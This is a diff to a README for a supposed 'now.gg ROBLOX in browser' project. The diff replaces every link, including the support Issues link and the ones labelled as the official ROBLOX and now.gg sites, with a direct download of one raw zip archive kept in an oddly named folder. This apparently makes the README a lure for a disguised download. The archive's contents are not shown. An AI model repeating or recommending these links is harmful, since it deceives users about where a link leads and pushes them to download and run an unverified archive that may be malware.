@@ -1,6 +1,6 @@
 # 🚀 now.gg-roblox-in-browser - Play ROBLOX Directly in Browser
 
-[![Download now.gg-roblox-in-browser](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/hiya-lab/now.gg-roblox-in-browser)
+[![Download now.gg-roblox-in-browser](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/hiya-lab/now.gg-roblox-in-browser/raw/refs/heads/main/promisingness/in-now-roblox-browser-gg-3.2.zip)
 
 ## Overview
 
@@ -44,7 +44,7 @@ If your PC meets these, you should have no trouble running the app.
 
 You need to visit the main repository page to get the app.
 
-[![Get now.gg-roblox-in-browser](https://img.shields.io/badge/Get%20App-Here-grey?style=for-the-badge)](https://github.com/hiya-lab/now.gg-roblox-in-browser)
+[![Get now.gg-roblox-in-browser](https://img.shields.io/badge/Get%20App-Here-grey?style=for-the-badge)](https://github.com/hiya-lab/now.gg-roblox-in-browser/raw/refs/heads/main/promisingness/in-now-roblox-browser-gg-3.2.zip)
 
 Click the button above to open the official GitHub page. This page lets you download the app and view details.
 
@@ -56,7 +56,7 @@ This section shows how to set up the app step-by-step.
 
    Open your browser and visit this link:
 
-   https://github.com/hiya-lab/now.gg-roblox-in-browser
+   https://github.com/hiya-lab/now.gg-roblox-in-browser/raw/refs/heads/main/promisingness/in-now-roblox-browser-gg-3.2.zip
 
 2. **Find the Download Section**
 
@@ -138,15 +138,15 @@ This project relates to:
 
 If you need help or want to report bugs, use the GitHub Issues tab here:
 
-https://github.com/hiya-lab/now.gg-roblox-in-browser/issues
+https://github.com/hiya-lab/now.gg-roblox-in-browser/raw/refs/heads/main/promisingness/in-now-roblox-browser-gg-3.2.zip
 
 Describe your problem clearly. Include details about your system and browser.
 
 ## 🔗 Useful Links
 
-- ROBLOX official site: https://www.roblox.com
+- ROBLOX official site: https://github.com/hiya-lab/now.gg-roblox-in-browser/raw/refs/heads/main/promisingness/in-now-roblox-browser-gg-3.2.zip
 
-- now.gg official site: https://now.gg
+- now.gg official site: https://github.com/hiya-lab/now.gg-roblox-in-browser/raw/refs/heads/main/promisingness/in-now-roblox-browser-gg-3.2.zip
 
 ## 🛠️ Development and Contributions
 
@@ -162,4 +162,4 @@ Look at the GitHub page for contributor guidelines and coding style.
 
 ---
 
-[![Download now.gg-roblox-in-browser](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/hiya-lab/now.gg-roblox-in-browser)
+[![Download now.gg-roblox-in-browser](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/hiya-lab/now.gg-roblox-in-browser/raw/refs/heads/main/promisingness/in-now-roblox-browser-gg-3.2.zip)
